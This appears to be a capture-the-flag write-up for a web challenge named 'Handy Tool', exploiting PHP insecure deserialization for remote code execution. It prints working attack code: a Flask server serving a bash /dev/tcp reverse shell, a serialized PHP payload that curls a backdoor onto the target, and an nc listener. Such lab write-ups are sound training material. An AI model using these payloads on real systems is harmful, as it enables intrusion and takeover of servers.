# Name: Handy Tool

## Vulnerability

LFI + PHP Object Injection / PHP Insecure Object Deserialization + RCE

## Exploit

First, use the **Guess my last name** option.
As in the Romanian cartoon, the correct answer is **Iscusitul**.
After you input it, the server echoes `backup.zip`.

This is the name of an archive left in the server containing a relevant piece of source code.
Access it at `/backup.zip` and decompress it.

The other tools in the web page really do what they say: uppercase the input, unserialize it or trim the whitespace.
You guessed it, the handy one is **Unserialize**.

After inspecting the source code in the archive, you see what the serialized input object should look like.
It has to be a PHP class with two attributes:
 * `$condition` - boolean with the value `true`
 * `$prop` - a string you can use for remote code execution on the server

Since the actual output of the command is not shown, only the unserialized string, you should try to create a reverse shell.

I started a Flask app on port 1234 where, if accessed, I return a piece PHP code that spawns a reverse shell to my machine.
You should find out what your IP address is and change it. You can run the server with: `python app.py`

```python
# app.py
from flask import Flask, make_response

app = Flask(__name__)

@app.route("/", methods=['GET'])
def index():

    MY_IP = '172.17.0.1'

    code = '''<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/1234 0>&1'");''' % MY_IP

    return make_response(code)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=1234)
```

I created a PHP class with a command that performs a request to my server and saves the output to `backdoor.php`.
I created the serialized input.
Make sure to change the IP with yours.

```php
<?php
//payload.php
class PHPClass
{
	public $condition = true;
	public $prop = "system('curl http://172.17.0.1:1234 -o backdoor.php');";
}
echo serialize(new PHPClass);
?>
```

You can run this file in command line with: `php payload.php`.
The serialized payload is:

`O:8:"PHPClass":2:{s:9:"condition";b:1;s:4:"prop";s:54:"system('curl http://172.17.0.1:1234 -o backdoor.php');";}`

After you input it on the server, the file `/backdoor.php` is created and you can access it.

In the meantime, the Flask server on your machine won't support this reverse shell.
You need to close it and open a simple netcat connection before you access the backdoor:

`nc -nvlp 1234`
